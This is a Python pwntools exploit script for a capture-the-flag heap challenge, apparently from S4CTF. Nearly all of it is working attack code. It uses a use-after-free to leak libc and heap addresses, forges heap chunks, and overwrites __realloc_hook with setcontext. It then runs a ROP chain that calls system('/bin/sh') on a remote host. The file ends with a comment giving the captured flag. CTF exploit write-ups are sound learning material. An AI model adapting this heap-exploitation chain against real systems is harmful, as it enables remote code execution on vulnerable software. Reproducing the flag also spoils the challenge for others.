#!/usr/bin/python3
from pwn import *
from time import sleep
from past.builtins import xrange
import subprocess
import random

# Util
def Set(idx,size,elements):
 global io
 io.sendlineafter('>> ','1')
 io.sendlineafter('index: ',f'{idx}')
 io.sendlineafter('size: ',f'{size}')
 for i in xrange(len(elements)):
  if elements[i] is None:
   elements[i] = 0
  io.sendlineafter('= ',f'{elements[i]}')

def Show(listindex,numberindex):
 global io
 io.sendlineafter('>> ','2')
 number = int(io.recvuntil('\n+').strip().split(b': ')[listindex+1].replace(b'[',b'').split(b', ')[numberindex],0)
 return number & 0xffffffff if number < 0 else number

def Swap(index1,index2):
 global io
 io.sendlineafter('>> ','3')
 io.sendlineafter('index 1: ',f'{index1}')
 io.sendlineafter('index 2: ',f'{index2}')

# Addr
unsortedbin_offset = 0x1ebbe0
system = 0x55410
__realloc_hook = 0x1ebb68
setcontext = 0x580a0
L_pop_rdi = 0x161dcd
L_ret = 0x25679
str_bin_sh = 0x1b75aa

# Exp
def hack():
 global io

 Set(0,0x110,[0x11 for i in xrange(0x110)]) #0
 Swap(0,10) # UAF
 libc_leak =  ( Show(0,1) << 32 ) + Show(0,0)
 libc_base = libc_leak - unsortedbin_offset
 log.info(f'Libc base: {hex(libc_base)}')

 Set(1,0x18//2,[0x41414141 for i in xrange(0x18//2)]) #1
 Set(0,0x4,[0x41414141]*4)
 heap_base = ( Show(1,3) << 32 ) + Show(1,2) - 0x10
 log.info(f'Heap base: {hex(heap_base)}')
 libc_upper_bytes = ( libc_base ) >> (32)

 for i in xrange(2,10):
  Set(i,0x18//2,[0x41414141] *(0x18//2))
 for i in xrange(9,1,-1):
  Set(i,0x22//2,[0x41414141]*(0x22//2))
 Set(1,0x18//2,[0]*(0x18//2)) #1

 crafted_array = [None] * (0x18//2)
 crafted_array[0] = (heap_base + 0x2b00 ) &0xffffffff
 crafted_array[1] = ( (heap_base + 0x2b00 )  ) >> ( 32 )
 Set(2,0x18//2,crafted_array) #2

 for i in xrange(3,8): #3 ~ 7
  Set(i, 0x18//2, [0x41]*(0x18//2))

 Set(8, 0x18//2, [0x41]*(0x18//2)) #8
 Set(9, 0x18//2, [0x41]*(0x18//2)) #9

 fake_size_array = [None] * (0x18//2)
 fake_size_array[6] = 0x181
 fake_size_array[7] = 0
 Set(0, 0x18//2, fake_size_array) #0

 Set(3, 0x22//2, [None]*0x11) #3
 Set(5, 0x22//2, [None]*0x11) #5
 Set(4, 0x22//2, [None]*0x11) #4

 realloc_fake_entry = [0x21]*0x5e
 realloc_fake_entry[0] = ( heap_base ) & 0xffffffff
 realloc_fake_entry[1] = ( heap_base >> 32 )
 realloc_fake_entry[8] = ( heap_base ) & 0xffffffff
 realloc_fake_entry[9] = ( ( heap_base ) ) >> ( 32 )
 realloc_fake_entry[14] = 0x41
 realloc_fake_entry[15] = 0
 realloc_fake_entry[16] = ( libc_base + __realloc_hook - 0x8)&0xffffffff
 realloc_fake_entry[17] = ( (libc_base ) ) >> ( 32 )
 realloc_fake_entry[0x4f] = 0
 realloc_fake_entry[0x4e] = 0x31
 Set(3, 0x5e, realloc_fake_entry) #3

 Set(4,0x38//4,[None]*(0x38//4)) #4
 realloc_hook_write = [None] * (0x38//4)
 realloc_hook_write[0] = 0
 realloc_hook_write[1] = 0
 realloc_hook_write[2] = ( libc_base + setcontext ) & 0xffffffff
 realloc_hook_write[3] = ( (libc_base ) ) >> ( 32 )
 Set(5, 0x38//4, realloc_hook_write) #5

 trampoline = [None] * (0x38//4)
 trampoline[8] = ( heap_base + 0x2f60 )&0xffffffff
 trampoline[9] = ((heap_base)) >> (32)
 trampoline[10] = ( libc_base + L_pop_rdi )&0xffffffff
 trampoline[11] = libc_upper_bytes

 L_ROP = [None] * (0x38//4)
 L_ROP[0] = ( libc_base + str_bin_sh) & 0xffffffff
 L_ROP[1] = libc_upper_bytes
 L_ROP[2] = ( libc_base + L_ret)&0xffffffff
 L_ROP[3] = libc_upper_bytes
 L_ROP[4] = ( libc_base + system ) & 0xffffffff
 L_ROP[5] = libc_upper_bytes
 Set(1,0x38//4,L_ROP)

 Set(8, 0x38//4, trampoline)
 io.sendlineafter('>> ','')

# Pwn
if __name__=='__main__':
#io = process('./chall')
 io = remote('185.14.184.242', 10990)
 hack()
 io.interactive()
 # cat flag-cb92a0412b2dffd2d514250a108e13a1.txt
 # S4CTF{0wn3rsh1p_iZ__s0m3T1m3s__7r0ubl3s0mE}